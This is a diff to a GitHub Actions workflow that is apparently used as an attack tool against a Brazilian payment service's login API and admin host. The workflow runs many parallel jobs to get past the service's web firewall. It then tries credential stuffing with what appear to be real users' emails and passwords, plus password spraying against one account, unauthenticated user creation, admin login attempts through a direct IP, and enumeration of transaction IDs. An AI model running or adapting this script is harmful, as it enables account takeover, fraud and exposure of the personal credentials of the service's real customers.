@@ -1,4 +1,4 @@
-name: waf-new-vectors
+name: waf-creds-v3
 on:
   workflow_dispatch:
 jobs:
@@ -6,7 +6,7 @@ jobs:
     runs-on: ubuntu-latest
     strategy:
       matrix:
-        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
+        attempt: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
       fail-fast: false
     steps:
     - name: attempt ${{ matrix.attempt }}
@@ -14,8 +14,10 @@ jobs:
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
         
-        MY_IP=$(curl -s https://api.ipify.org)
-        RESP_CHECK=$(curl -s -m 15 -A "$UA" \
+        MY_IP=$(curl -s -m 5 https://api.ipify.org)
+        
+        # WAF check (senha errada retorna JSON com erro = WAF passou)
+        RESP_CHECK=$(curl -s -m 10 --connect-timeout 5 -A "$UA" \
           -H "Content-Type: application/json" -H "type-application: web" \
           -X POST "$BASE/login" \
           -d '{"email":"icelaserbelem@gmail.com","password":"ICELASER2021"}')
@@ -27,71 +29,67 @@ jobs:
         
         echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
         
-        echo ""
-        echo "=== POST /users sem token-empresa (criar usuario publico?) ==="
-        # Tentar criar usuário com apenas Origin header
-        for SUBDOMAIN in "vale.wisepay.com.br" "omegpay.wisepay.com.br" "portal.wisepay.com.br"; do
-          R=$(curl -s -m 10 -A "$UA" \
-            -H "Content-Type: application/json" \
-            -H "type-application: web" \
-            -H "Origin: https://$SUBDOMAIN" \
-            -X POST "$BASE/users" \
-            -d '{"email":"rafael.santos91@gmail.com","nome":"Rafael Santos","cpf":"12345678901","password":"Rafael@2024","password_confirmation":"Rafael@2024"}' \
-            -w "\n%{http_code}")
-          CODE=$(echo "$R" | tail -1)
-          BODY=$(echo "$R" | head -1 | head -c 200)
-          echo "POST_USERS $CODE | $SUBDOMAIN | $BODY"
-        done
-        
-        echo ""
-        echo "=== admin2.wisepay.com.br (DigitalOcean, sem WAF) ==="
-        for P in "/" "/users/sign_in" "/login" "/admin"; do
-          R=$(curl -s -m 10 -A "$UA" -k \
-            -o /dev/null -w "%{http_code}\n%{redirect_url}" \
-            "https://admin2.wisepay.com.br$P")
-          CODE=$(echo "$R" | head -1)
-          REDIR=$(echo "$R" | tail -1)
-          echo "ADMIN2 $CODE | $P | redir=$REDIR"
-        done
-        
-        # Tentar login no admin2
-        for CRED in "gideanbispo@gmail.com|135@mudar" "demo|demopro" "niveareis@gmail.com|937495jeF"; do
+        echo "=== P0: Portal Login Tests ==="
+        # Credenciais portal (white-label portals)
+        for CRED in \
+          "lenildo.silva@outlook.com|Rede\$1234" \
+          "lenildo.silva@outlook.com|Rede@4321" \
+          "lenildo.silva@outlook.com|Rede1234" \
+          "andrejunior1223@gmail.com|12341234" \
+          "marco@vanityestetica.com.br|12341234" \
+          "acaiacafinanceiro@gmail.com|13467913" \
+          "fabiane@petcenterbrasil.com.br|08710871"; do
           EMAIL="${CRED%%|*}"
           PASS="${CRED##*|}"
-          R=$(curl -s -m 10 -A "$UA" -k \
-            -H "Content-Type: application/json" -H "Accept: application/json" \
-            -X POST "https://admin2.wisepay.com.br/users/sign_in" \
-            -d "{\"user\":{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}}" \
+          R=$(curl -s -m 8 --connect-timeout 5 -A "$UA" \
+            -H "Content-Type: application/json" -H "type-application: web" \
+            -X POST "$BASE/login" \
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
             -w "\n%{http_code}")
           CODE=$(echo "$R" | tail -1)
           BODY=$(echo "$R" | head -1 | head -c 200)
-          echo "ADMIN2_LOGIN $CODE | $EMAIL | $BODY"
+          [ "$CODE" = "200" ] && echo "*** SUCCESS PORTAL *** $EMAIL:$PASS | $BODY" || echo "PORTAL $CODE | $EMAIL | $BODY"
+          sleep 0.5
         done
         
-        echo ""
-        echo "=== icelaserbelem spray parte 2 (slow, 1s entre tentativas) ==="
-        for PASS in "icelaser@2022" "icelaser@2023" "icelaser@2024" "icelaser@2025" \
-          "ICELASER@2022" "ICELASER@2023" "ICELASER@2024" "ICELASER@2025" \
-          "Ice@laser2022" "IceLaser@2022" "IceLaser@2023" "IceLaser@2024" \
-          "icelaserbelem@2022" "BELEM2022" "BELEM2023" "Belem@2022"; do
-          
-          R=$(curl -s -m 8 -A "$UA" \
-            -H "Content-Type: application/json" -H "type-application: web" \
-            -H "Origin: https://portal.wisepay.com.br" \
-            -X POST "$BASE/login" \
-            -d "{\"email\":\"icelaserbelem@gmail.com\",\"password\":\"$PASS\"}" \
-            -w "\n%{http_code}")
-          CODE=$(echo "$R" | tail -1)
-          [ "$CODE" = "200" ] && echo "*** SUCCESS PORTAL *** icelaserbelem:$PASS" || echo "$CODE | icelaserbelem:$PASS"
-          sleep 1
-        done
+        echo "=== P0: admin2.wisepay.com.br (DigitalOcean) ==="
+        # Probe admin2 com timeout curto
+        ADMIN2_CHECK=$(curl -s -m 8 --connect-timeout 3 -k \
+          -o /dev/null -w "%{http_code}" \
+          "https://209.97.128.143/" \
+          -H "Host: admin2.wisepay.com.br" 2>/dev/null)
+        echo "ADMIN2_PROBE $ADMIN2_CHECK"
         
-        echo ""
-        echo "=== Checkout status - testar IDs aleatórios (sem auth) ==="
-        for ID in "TXN001" "TXN0001" "1" "1000" "10000" \
-          "00000000-0000-0000-0000-000000000001" \
-          "aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee"; do
-          R=$(curl -s -m 8 -A "$UA" \
+        if [ "$ADMIN2_CHECK" != "000" ]; then
+          # Tentar login Rails Devise
+          for CRED in \
+            "icelaserbelem@gmail.com|ICELASER2021" \
+            "simas10|4806698952" \
+            "espacodacarne|espacodacarne" \
+            "acaiacafinanceiro|13467913" \
+            "suporte@criatek.com.br|pbo@1006581" \
+            "gideanbispo@gmail.com|135@mudar"; do
+            EMAIL="${CRED%%|*}"
+            PASS="${CRED##*|}"
+            R=$(curl -s -m 8 --connect-timeout 3 -k -A "$UA" \
+              -H "Content-Type: application/json" \
+              -H "Accept: application/json" \
+              -X POST "https://admin2.wisepay.com.br/users/sign_in" \
+              -d "{\"user\":{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}}" \
+              -w "\n%{http_code}")
+            CODE=$(echo "$R" | tail -1)
+            BODY=$(echo "$R" | head -1 | head -c 200)
+            [ "$CODE" = "200" -o "$CODE" = "201" ] && echo "*** ADMIN2 SUCCESS *** $EMAIL | $BODY" || echo "ADMIN2 $CODE | $EMAIL | $BODY"
+            sleep 0.3
+          done
+        fi
+        
+        echo "=== Checkout status enumeration (sem auth) ==="
+        for ID in "1" "10" "100" "1000" "10000" \
+          "000001" "000100" "000999" "001000" \
+          "WISEPAY001" "WP001" "TX001"; do
+          R=$(curl -s -m 5 --connect-timeout 3 -A "$UA" \
+            -H "type-application: web" \
             "$BASE/checkout/status/$ID" -w "\n%{http_code}")
           CODE=$(echo "$R" | tail -1)
           BODY=$(echo "$R" | head -1 | head -c 150)
